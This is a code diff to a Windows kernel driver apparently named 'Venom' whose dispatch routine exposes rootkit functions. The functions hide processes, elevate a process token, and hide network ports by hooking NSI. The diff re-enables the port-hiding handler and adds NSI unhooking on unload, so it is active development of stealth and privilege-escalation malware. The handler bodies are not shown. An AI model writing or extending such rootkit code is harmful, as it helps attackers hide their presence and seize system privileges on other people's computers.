@@ -3,11 +3,6 @@
 #include "Ioctl.h"
 #include "NetworkHandler.h"
 
-// Prototypes
-void VenomUnload(PDRIVER_OBJECT DriverObject);
-NTSTATUS VenomCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
-NTSTATUS VenomDeviceControl(PDEVICE_OBJECT, PIRP Irp);
-
 extern "C" NTSTATUS
 DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
 	UNREFERENCED_PARAMETER(RegistryPath);
@@ -76,20 +71,15 @@ NTSTATUS VenomDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		status = IoctlHandlers::HideProcess(Irp);
 		break;
 
-	/*case VenomIoctls::TestConnection:
-
-		status = IoctlHandlers::TestConnection(Irp, stack->Parameters.DeviceIoControl.OutputBufferLength);
-		break;*/
-
 	case VenomIoctls::Elevate:
 
 		status = IoctlHandlers::ElevateToken(Irp);
 		break;
 
-	/*case VenomIoctls::HidePort:
+	case VenomIoctls::HidePort:
 
 		status = IoctlHandlers::HidePort(Irp);
-		break;*/
+		break;
 	default:
 		Irp->IoStatus.Information = 0;
 		status = STATUS_INVALID_DEVICE_REQUEST;
@@ -106,4 +96,11 @@ void VenomUnload(PDRIVER_OBJECT DriverObject)
 
 	IoDeleteSymbolicLink(&symLink);
 	IoDeleteDevice(DriverObject->DeviceObject);
+
+	// Unhook NSI.
+	auto status = NetworkHandler::unhookNsi();
+	if (!NT_SUCCESS(status))
+	{
+		DbgPrint("Couldn't unhook NSI");
+	}
 }
